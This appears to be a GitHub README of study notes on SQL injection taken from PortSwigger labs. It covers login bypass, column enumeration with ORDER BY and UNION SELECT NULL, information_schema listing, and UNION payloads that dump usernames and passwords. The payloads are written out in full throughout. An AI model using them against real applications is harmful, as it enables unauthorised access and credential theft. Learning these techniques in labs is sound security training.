# SQL-Injection_Bug_Bounty
##All taken fron portswigger lab

The application doesn't implement any defenses against SQL injection attacks, so an attacker can construct an attack like:

	https://insecure-website.com/products?category=Gifts'--
This results in the SQL query:

	SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
Going further, an attacker can cause the application to display all the products in any category, including categories that they don't know about:

	https://insecure-website.com/products?category=Gifts'+OR+1=1--
  
	SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
	since 1=1 is always true
Check response:    ‘--      |   #--

**Subverting application logic/Login form:**

Here, an attacker can log in as any user without a password simply by using the SQL comment sequence -- to remove the password check from the WHERE clause of the query. For example, submitting the username administrator'-- and a blank password results in the following query:

	SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

![image](https://user-images.githubusercontent.com/37367596/192005023-3f13a816-0a13-4f0a-8ff5-cf85222e8604.png)


**Retrieving data from other database tables/Union attack:**

For a UNION query to work, two key requirements must be met:

 1.The individual queries must return the same number of columns.
 
 2.The data types in each column must be compatible between the individual queries.

To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out

 1.How many columns are being returned from the original query?
 
 2.Which columns returned from the original query are of a suitable data type to hold the results from the injected query?
 
**There are two effective methods to determine how many columns are being returned from the original query.**
**The first method** involves injecting a series of** ORDER BY** clauses and incrementing the specified column index until an error occurs.

' ORDER BY 1--

 ' ORDER BY 2-- 
 
' ORDER BY 3--
etc.
![image](https://user-images.githubusercontent.com/37367596/192006415-207e60bb-4977-4895-9a57-43fed4f6c250.png)


The application might actually return the **database error** in its HTTP response, or it might return a **generic error**, or simply return **no results**

**The second method** involves submitting a series of UNION SELECT payloads specifying a different number of null values

' UNION SELECT NULL—

 ' UNION SELECT NULL,NULL—
 
 ' UNION SELECT NULL,NULL,NULL– 

' UNION SELECT NULL FROM DUAL--     (oracale database)

**Finding columns with a useful data type(string/int/or other types) in an SQL injection UNION attack**

' UNION SELECT NULL,NULL,NULL,'a'—

' UNION SELECT NULL,'a',NULL,NULL—

' UNION SELECT username, password(coloumns) FROM users– (table)

![image](https://user-images.githubusercontent.com/37367596/192007589-7f01ddc9-e5a5-40a5-8004-c2c116e0ca55.png)

![image](https://user-images.githubusercontent.com/37367596/192009263-e2ee5bbc-e882-44d2-835a-b46c1b5ad3aa.png)

**Listing the contents of the database:**

Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.

	SELECT * FROM information_schema.tables
	
**You can then query information_schema.columns to list the columns in individual tables**

	SELECT * FROM information_schema.columns WHERE table_name = 'Users
	
	
 **Use the following payload to retrieve the list of database:**
 
	' UNION select schema_name,NUll from INFORMATION_SCHEMA.SCHEMATA--
	
**2.Use the following payload to retrieve the list of tables in the database:**

	'UNION SELECT table_name,NULL FROM information_schema.tables--
	
schema_name=database;

information_schema=databaseName

**3.Use the following payload (replacing the table name) to retrieve the details of the columns in the table**

 'UNION SELECT column_name ,NULL FROM information_schema.columns WHERE table_name='users_uvlvoo'—

**4. To find information of username and password**

	‘ UNION SELECT username_jovsyx, password_abwqcw FROM users_uvlvoo– 
	
    concate: ' UNION SELECT NULL,username || '---->' || password FROM users--

![image](https://user-images.githubusercontent.com/37367596/192010124-561016c4-f865-469f-9c8d-6f0a388e86b1.png)

	
	

	






